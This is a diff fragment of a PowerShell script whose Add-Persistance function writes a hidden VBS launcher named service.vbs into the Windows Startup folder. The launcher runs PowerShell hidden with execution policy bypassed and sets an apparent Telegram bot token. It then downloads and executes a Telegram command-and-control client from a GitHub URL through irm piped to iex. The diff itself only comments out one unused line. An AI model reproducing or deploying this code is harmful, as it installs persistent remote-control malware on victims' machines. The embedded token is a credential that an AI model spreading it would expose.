@@ -406,9 +406,9 @@ Function Add-Persistance{
 #    }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
-userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
 objShell.Run "powershell -NoP -Ep Bypass -W H -C $tg='6609237868:AAH3RePygk7Q6uAbvpasSiddOHIrLM3QGYI';irm https://raw.githubusercontent.com/poiuztreq/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex""", 0, True
 '@
+#userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
 
 $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
